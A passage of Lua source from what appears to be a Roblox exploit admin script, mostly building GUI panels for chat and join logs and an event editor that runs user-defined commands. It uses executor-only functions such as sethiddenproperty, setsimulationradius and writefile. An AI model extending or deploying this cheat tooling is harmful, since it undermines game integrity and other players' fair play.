	scroll_2.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	table.insert(scroll,scroll_2)
	table.insert(shade2,scroll_2)

	join.Name = "join"
	join.Parent = background
	join.Active = true
	join.BackgroundColor3 = Color3.new(0.141176, 0.141176, 0.145098)
	join.BorderSizePixel = 0
	join.ClipsDescendants = true
	join.Size = UDim2.new(0, 338, 0, 245)
	join.Visible = false
	join.ZIndex = 10
	table.insert(shade1,join)

	Toggle_2.Name = "Toggle"
	Toggle_2.Parent = join
	Toggle_2.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	Toggle_2.BorderSizePixel = 0
	Toggle_2.Position = UDim2.new(0, 60, 0, 220)
	Toggle_2.Size = UDim2.new(0, 66, 0, 20)
	Toggle_2.ZIndex = 10
	Toggle_2.Font = Enum.Font.SourceSans
	Toggle_2.FontSize = Enum.FontSize.Size14
	Toggle_2.Text = "Disabled"
	Toggle_2.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade2,Toggle_2)
	table.insert(text1,Toggle_2)

	Clear_2.Name = "Clear"
	Clear_2.Parent = join
	Clear_2.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	Clear_2.BorderSizePixel = 0
	Clear_2.Position = UDim2.new(0, 5, 0, 220)
	Clear_2.Size = UDim2.new(0, 50, 0, 20)
	Clear_2.ZIndex = 10
	Clear_2.Font = Enum.Font.SourceSans
	Clear_2.FontSize = Enum.FontSize.Size14
	Clear_2.Text = "Clear"
	Clear_2.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade2,Clear_2)
	table.insert(text1,Clear_2)

	scroll_3.Name = "scroll"
	scroll_3.Parent = join
	scroll_3.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	scroll_3.BorderSizePixel = 0
	scroll_3.Position = UDim2.new(0, 5, 0, 25)
	scroll_3.Size = UDim2.new(0, 328, 0, 190)
	scroll_3.ZIndex = 10
	scroll_3.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	scroll_3.CanvasSize = UDim2.new(0, 0, 0, 10)
	scroll_3.ScrollBarThickness = 8
	scroll_3.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	table.insert(scroll,scroll_3)
	table.insert(shade2,scroll_3)

	selectChat.Name = "selectChat"
	selectChat.Parent = background
	selectChat.BackgroundColor3 = Color3.new(0.180392, 0.180392, 0.184314)
	selectChat.BorderSizePixel = 0
	selectChat.Position = UDim2.new(0, 5, 0, 5)
	selectChat.Size = UDim2.new(0, 164, 0, 20)
	selectChat.ZIndex = 10
	selectChat.Font = Enum.Font.SourceSans
	selectChat.FontSize = Enum.FontSize.Size14
	selectChat.Text = "Chat Logs"
	selectChat.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade2,selectChat)
	table.insert(text1,selectChat)

	selectJoin.Name = "selectJoin"
	selectJoin.Parent = background
	selectJoin.BackgroundColor3 = Color3.new(0.305882, 0.305882, 0.309804)
	selectJoin.BorderSizePixel = 0
	selectJoin.Position = UDim2.new(0, 169, 0, 5)
	selectJoin.Size = UDim2.new(0, 164, 0, 20)
	selectJoin.ZIndex = 10
	selectJoin.Font = Enum.Font.SourceSans
	selectJoin.FontSize = Enum.FontSize.Size14
	selectJoin.Text = "Join Logs"
	selectJoin.TextColor3 = Color3.new(1, 1, 1)
	table.insert(shade3,selectJoin)
	table.insert(text1,selectJoin)

	function create(data)
		local insts = {}
		for i,v in pairs(data) do insts[v[1]] = Instance.new(v[2]) end

		for _,v in pairs(data) do
			for prop,val in pairs(v[3]) do
				if type(val) == "table" then
					insts[v[1]][prop] = insts[val[1]]
				else
					insts[v[1]][prop] = val
				end
			end
		end

		return insts[1]
	end

	ViewportTextBox = (function()
		local textService = game:GetService("TextService")

		local funcs = {}
		funcs.Update = function(self)
			local cursorPos = self.TextBox.CursorPosition
			local text = self.TextBox.Text
			if text == "" then self.TextBox.Position = UDim2.new(0,2,0,0) return end
			if cursorPos == -1 then return end

			local cursorText = text:sub(1,cursorPos-1)
			local pos = nil
			local leftEnd = -self.TextBox.Position.X.Offset
			local rightEnd = leftEnd + self.View.AbsoluteSize.X

			local totalTextSize = textService:GetTextSize(text,self.TextBox.TextSize,self.TextBox.Font,Vector2.new(999999999,100)).X
			local cursorTextSize = textService:GetTextSize(cursorText,self.TextBox.TextSize,self.TextBox.Font,Vector2.new(999999999,100)).X

			if cursorTextSize > rightEnd then
				pos = math.max(-2,cursorTextSize - self.View.AbsoluteSize.X + 2)
			elseif cursorTextSize < leftEnd then
				pos = math.max(-2,cursorTextSize-2)
			elseif totalTextSize < rightEnd then
				pos = math.max(-2,totalTextSize - self.View.AbsoluteSize.X + 2)
			end

			if pos then
				self.TextBox.Position = UDim2.new(0,-pos,0,0)
				self.TextBox.Size = UDim2.new(1,pos,1,0)
			end
		end

		local mt = {}
		mt.__index = funcs

		local function convert(textbox)
			local obj = setmetatable({OffsetX = 0, TextBox = textbox},mt)

			local view = Instance.new("Frame")
			view.BackgroundTransparency = textbox.BackgroundTransparency
			view.BackgroundColor3 = textbox.BackgroundColor3
			view.BorderSizePixel = textbox.BorderSizePixel
			view.BorderColor3 = textbox.BorderColor3
			view.Position = textbox.Position
			view.Size = textbox.Size
			view.ClipsDescendants = true
			view.Name = textbox.Name
			view.ZIndex = 10
			textbox.BackgroundTransparency = 1
			textbox.Position = UDim2.new(0,4,0,0)
			textbox.Size = UDim2.new(1,-8,1,0)
			textbox.TextXAlignment = Enum.TextXAlignment.Left
			textbox.Name = "Input"
			table.insert(text1,textbox)
			table.insert(shade2,view)

			obj.View = view

			textbox.Changed:Connect(function(prop)
				if prop == "Text" or prop == "CursorPosition" or prop == "AbsoluteSize" then
					obj:Update()
				end
			end)

			obj:Update()

			view.Parent = textbox.Parent
			textbox.Parent = view

			return obj
		end

		return {convert = convert}
	end)()

	ViewportTextBox.convert(Cmdbar).View.ZIndex = 10
	ViewportTextBox.convert(Cmdbar_2).View.ZIndex = 10

	IYMouse = Players.LocalPlayer:GetMouse()
	UserInputService = game:GetService("UserInputService")

	local sethidden = sethiddenproperty or set_hidden_property or set_hidden_prop
	local gethidden = gethiddenproperty or get_hidden_property or get_hidden_prop
	local setsimulation = setsimulationradius or set_simulation_radius

	function writefileExploit()
		if writefile then
			return true
		end
	end

	function isNumber(str)
		if tonumber(str) ~= nil or str == 'inf' then
			return true
		end
	end

	function getRoot(char)
		local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
		return rootPart
	end

	function tools(plr)
		if plr:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass('Tool') or plr.Character:FindFirstChildOfClass('Tool') then
			return true
		end
	end

	function r15(plr)
		if plr.Character:FindFirstChildOfClass('Humanoid').RigType == Enum.HumanoidRigType.R15 then
			return true
		end
	end

	function toClipboard(String)
		local clipBoard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
		if clipBoard then
			clipBoard(String)
			notify('Clipboard','Copied to clipboard')
		else
			notify('Clipboard',"Your exploit doesn't have the ability to use the clipboard")
		end
	end

	function getHierarchy(obj)
		local fullname
		local period

		if string.find(obj.Name,' ') then
			fullname = '["'..obj.Name..'"]'
			period = false
		else
			fullname = obj.Name
			period = true
		end

		local getS = obj
		local parent = obj
		local service = ''

		if getS.Parent ~= game then
			repeat
				getS = getS.Parent
				service = getS.ClassName
			until getS.Parent == game
		end

		if parent.Parent ~= getS then
			repeat
				parent = parent.Parent
				if string.find(tostring(parent),' ') then
					if period then
						fullname = '["'..parent.Name..'"].'..fullname
					else
						fullname = '["'..parent.Name..'"]'..fullname
					end
					period = false
				else
					if period then
						fullname = parent.Name..'.'..fullname
					else
						fullname = parent.Name..''..fullname
					end
					period = true
				end
			until parent.Parent == getS
		elseif string.find(tostring(parent),' ') then
			fullname = '["'..parent.Name..'"]'
			period = false
		end

		if period then
			return 'game:GetService("'..service..'").'..fullname
		else
			return 'game:GetService("'..service..'")'..fullname
		end
	end

	AllWaypoints = {}

	local cooldown = false
	function writefileCooldown(name,data)
		spawn(function()
			if not cooldown then
				cooldown = true
				writefile(name, data)
			else
				repeat wait() until cooldown == false
				writefileCooldown(name,data)
			end
			wait(3)
			cooldown = false
		end)
	end

	function dragGUI(gui)
		spawn(function()
			local dragging
			local dragInput
			local dragStart = Vector3.new(0,0,0)
			local startPos
			local function update(input)
				local delta = input.Position - dragStart
				local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
				game:GetService("TweenService"):Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
			end
			gui.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					dragStart = input.Position
					startPos = gui.Position

					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end)
			gui.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end)
			UserInputService.InputChanged:Connect(function(input)
				if input == dragInput and dragging then
					update(input)
				end
			end)
		end)
	end

	dragGUI(logs)
	dragGUI(KeybindEditor)
	dragGUI(PluginEditor)
	dragGUI(ToPartFrame)

	eventEditor = (function()
		local events = {}

		local function registerEvent(name,sets)
			events[name] = {
				commands = {},
				sets = sets or {}
			}
		end

		local onEdited = nil

		local function fireEvent(name,...)
			local args = {...}
			local event = events[name]
			if event then
				for i,cmd in pairs(event.commands) do
					local metCondition = true
					for idx,set in pairs(event.sets) do
						local argVal = args[idx]
						local cmdSet = cmd[2][idx]
						local condType = set.Type
						if condType == "Player" then
							if cmdSet == 0 then
								metCondition = metCondition and (tostring(Players.LocalPlayer) == argVal)
							elseif cmdSet ~= 1 then
								metCondition = metCondition and table.find(getPlayer(cmdSet,Players.LocalPlayer),argVal)
							end
						elseif condType == "String" then
							if cmdSet ~= 0 then
								metCondition = metCondition and string.find(argVal:lower(),cmdSet:lower())
							end
						elseif condType == "Number" then
							if cmdSet ~= 0 then
								metCondition = metCondition and tonumber(argVal)<=tonumber(cmdSet)
							end
						end
						if not metCondition then break end
					end

					if metCondition then
						pcall(coroutine.wrap(function()
							local cmdStr = cmd[1]
							for count,arg in pairs(args) do
								cmdStr = cmdStr:gsub("%$"..count,arg)
							end
							wait(cmd[3] or 0)
							execCmd(cmdStr)
						end))
					end
				end
			end
		end

		local main = create({
			{1,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderSizePixel=0,Name="EventEditor",Position=UDim2.new(0.5,-175,0,-500),Size=UDim2.new(0,350,0,20),ZIndex=10,}},
			{2,"Frame",{BackgroundColor3=currentShade2,BorderSizePixel=0,Name="TopBar",Parent={1},Size=UDim2.new(1,0,0,20),ZIndex=10,}},
			{3,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={2},Position=UDim2.new(0,0,0,0),Size=UDim2.new(1,0,0.95,0),Text="Event Editor",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=Enum.TextXAlignment.Center,ZIndex=10,}},
			{4,"TextButton",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Close",Parent={2},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{5,"ImageLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Image="rbxassetid://5054663650",Parent={4},Position=UDim2.new(0,5,0,5),Size=UDim2.new(0,10,0,10),ZIndex=10,}},
			{6,"Frame",{BackgroundColor3=currentShade1,BorderSizePixel=0,Name="Content",Parent={1},Position=UDim2.new(0,0,0,20),Size=UDim2.new(1,0,0,202),ZIndex=10,}},
			{7,"ScrollingFrame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,BottomImage="rbxasset://textures/ui/Scroll/scroll-middle.png",CanvasSize=UDim2.new(0,0,0,100),Name="List",Parent={6},Position=UDim2.new(0,5,0,5),ScrollBarImageColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),ScrollBarThickness=8,Size=UDim2.new(1,-10,1,-10),TopImage="rbxasset://textures/ui/Scroll/scroll-middle.png",ZIndex=10,}},
			{8,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Holder",Parent={7},Size=UDim2.new(1,0,1,0),ZIndex=10,}},
			{9,"UIListLayout",{Parent={8},SortOrder=2,}},
			{10,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.3137255012989,0.3137255012989,0.3137255012989),BorderSizePixel=0,ClipsDescendants=true,Name="Settings",Parent={6},Position=UDim2.new(1,0,0,0),Size=UDim2.new(0,150,1,0),ZIndex=10,}},
			{11,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),Name="Slider",Parent={10},Position=UDim2.new(0,-150,0,0),Size=UDim2.new(1,0,1,0),ZIndex=10,}},
			{12,"Frame",{BackgroundColor3=Color3.new(0.23529413342476,0.23529413342476,0.23529413342476),BorderColor3=Color3.new(0.3137255012989,0.3137255012989,0.3137255012989),BorderSizePixel=0,Name="Line",Parent={11},Size=UDim2.new(0,1,1,0),ZIndex=10,}},
			{13,"ScrollingFrame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,BottomImage="rbxasset://textures/ui/Scroll/scroll-middle.png",CanvasSize=UDim2.new(0,0,0,100),Name="List",Parent={11},Position=UDim2.new(0,0,0,25),ScrollBarImageColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),ScrollBarThickness=8,Size=UDim2.new(1,0,1,-25),TopImage="rbxasset://textures/ui/Scroll/scroll-middle.png",ZIndex=10,}},
			{14,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Holder",Parent={13},Size=UDim2.new(1,0,1,0),ZIndex=10,}},
			{15,"UIListLayout",{Parent={14},SortOrder=2,}},
			{16,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={11},Size=UDim2.new(1,0,0,20),Text="Event Settings",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{17,"TextButton",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Font=3,Name="Close",BorderSizePixel=0,Parent={11},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="<",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
			{18,"Folder",{Name="Templates",Parent={10},}},
			{19,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="Players",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,86),Visible=false,ZIndex=10,}},
			{20,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={19},Size=UDim2.new(1,0,0,20),Text="Choose Players",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{21,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Any",Parent={19},Position=UDim2.new(0,5,0,42),Size=UDim2.new(1,-10,0,20),Text="Any Player",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{22,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={21},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{23,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={22},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{24,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Me",Parent={19},Position=UDim2.new(0,5,0,20),Size=UDim2.new(1,-10,0,20),Text="Me Only",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{25,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={24},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{26,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={25},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{27,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,ClearTextOnFocus=false,Font=3,Name="Custom",Parent={19},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),PlaceholderText="Custom Player Set",Position=UDim2.new(0,5,0,64),Size=UDim2.new(1,-35,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{28,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="CustomButton",Parent={19},Position=UDim2.new(1,-25,0,64),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{29,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={28},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{30,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="Strings",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,64),Visible=false,ZIndex=10,}},
			{31,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={30},Size=UDim2.new(1,0,0,20),Text="Choose String",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{32,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Any",Parent={30},Position=UDim2.new(0,5,0,20),Size=UDim2.new(1,-10,0,20),Text="Any String",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{33,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={32},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{34,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={33},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{54,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="Numbers",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,64),Visible=false,ZIndex=10,}},
			{55,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={54},Size=UDim2.new(1,0,0,20),Text="Choose String",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{56,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Any",Parent={54},Position=UDim2.new(0,5,0,20),Size=UDim2.new(1,-10,0,20),Text="Any Number",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{57,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="Button",Parent={56},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{58,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={57},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{59,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,ClearTextOnFocus=false,Font=3,Name="Custom",Parent={54},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),PlaceholderText="Number",Position=UDim2.new(0,5,0,42),Size=UDim2.new(1,-35,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{60,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="CustomButton",Parent={54},Position=UDim2.new(1,-25,0,42),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{61,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={60},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{35,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,ClearTextOnFocus=false,Font=3,Name="Custom",Parent={30},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),PlaceholderText="Match String",Position=UDim2.new(0,5,0,42),Size=UDim2.new(1,-35,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{36,"Frame",{BackgroundColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),BorderSizePixel=0,Name="CustomButton",Parent={30},Position=UDim2.new(1,-25,0,42),Size=UDim2.new(0,20,0,20),ZIndex=10,}},
			{37,"TextButton",{BackgroundColor3=Color3.new(0.58823531866074,0.58823531866074,0.59215688705444),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="On",Parent={36},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),Text="",TextColor3=Color3.new(0,0,0),TextSize=14,ZIndex=10,}},
			{38,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),Name="DelayEditor",Parent={18},Position=UDim2.new(0,0,0,25),Size=UDim2.new(1,0,0,24),Visible=false,ZIndex=10,}},
			{39,"TextBox",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,Font=3,Name="Secs",Parent={38},PlaceholderColor3=Color3.new(0.47058826684952,0.47058826684952,0.47058826684952),Position=UDim2.new(0,60,0,2),Size=UDim2.new(1,-65,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{40,"TextLabel",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Label",Parent={39},Position=UDim2.new(0,-55,0,0),Size=UDim2.new(1,0,1,0),Text="Delay (s):",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{41,"Frame",{BackgroundColor3=currentShade1,BorderSizePixel=0,ClipsDescendants=true,Name="EventTemplate",Parent={6},Size=UDim2.new(1,0,0,20),Visible=false,ZIndex=10,}},
			{42,"TextButton",{BackgroundColor3=currentText1,BackgroundTransparency=1,Font=3,Name="Expand",Parent={41},Size=UDim2.new(0,20,0,20),Text=">",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
			{43,"TextLabel",{BackgroundColor3=currentText1,BackgroundTransparency=1,Font=3,Name="EventName",Parent={41},Position=UDim2.new(0,25,0,0),Size=UDim2.new(1,-25,0,20),Text="OnSpawn",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{44,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BorderSizePixel=0,BackgroundTransparency=1,ClipsDescendants=true,Name="Cmds",Parent={41},Position=UDim2.new(0,0,0,20),Size=UDim2.new(1,0,1,-20),ZIndex=10,}},
			{45,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BorderColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),Name="Add",Parent={44},Position=UDim2.new(0,0,1,-20),Size=UDim2.new(1,0,0,20),ZIndex=10,}},
			{46,"TextBox",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,ClearTextOnFocus=false,Font=3,Parent={45},PlaceholderColor3=Color3.new(0.7843137383461,0.7843137383461,0.7843137383461),PlaceholderText="Add new command",Position=UDim2.new(0,5,0,0),Size=UDim2.new(1,-10,1,0),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{47,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Holder",Parent={44},Size=UDim2.new(1,0,1,-20),ZIndex=10,}},
			{48,"UIListLayout",{Parent={47},SortOrder=2,}},
			{49,"Frame",{currentShade1,BorderSizePixel=0,ClipsDescendants=true,Name="CmdTemplate",Parent={6},Size=UDim2.new(1,0,0,20),Visible=false,ZIndex=10,}},
			{50,"TextBox",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,ClearTextOnFocus=false,Font=3,Parent={49},PlaceholderColor3=Color3.new(1,1,1),Position=UDim2.new(0,5,0,0),Size=UDim2.new(1,-45,0,20),Text="a\\b\\c\\d",TextColor3=currentText1,TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{51,"TextButton",{BackgroundColor3=currentShade1,BorderSizePixel=0,Font=3,Name="Delete",Parent={49},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="X",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
			{52,"TextButton",{BackgroundColor3=currentShade1,BorderSizePixel=0,Font=3,Name="Settings",Parent={49},Position=UDim2.new(1,-40,0,0),Size=UDim2.new(0,20,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
			{53,"ImageLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Image="rbxassetid://1204397029",Parent={52},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),ZIndex=10,}},
		})
		main.Name = randomString()
		local mainFrame = main:WaitForChild("Content")
		local eventList = mainFrame:WaitForChild("List")
		local eventListHolder = eventList:WaitForChild("Holder")
		local cmdTemplate = mainFrame:WaitForChild("CmdTemplate")
		local eventTemplate = mainFrame:WaitForChild("EventTemplate")
		local settingsFrame = mainFrame:WaitForChild("Settings"):WaitForChild("Slider")
		local settingsTemplates = mainFrame.Settings:WaitForChild("Templates")
		local settingsList = settingsFrame:WaitForChild("List"):WaitForChild("Holder")
		table.insert(shade2,main.TopBar) table.insert(shade1,mainFrame) table.insert(shade2,eventTemplate)
		table.insert(text1,eventTemplate.EventName) table.insert(shade1,eventTemplate.Cmds.Add) table.insert(shade1,cmdTemplate)
		table.insert(text1,cmdTemplate.TextBox) table.insert(shade2,cmdTemplate.Delete) table.insert(shade2,cmdTemplate.Settings)
		table.insert(scroll,mainFrame.List) table.insert(shade1,settingsFrame) table.insert(shade2,settingsFrame.Line)
		table.insert(shade2,settingsFrame.Close) table.insert(scroll,settingsFrame.List) table.insert(shade2,settingsTemplates.DelayEditor.Secs)
		table.insert(text1,settingsTemplates.DelayEditor.Secs) table.insert(text1,settingsTemplates.DelayEditor.Secs.Label) table.insert(text1,settingsTemplates.Players.Title)
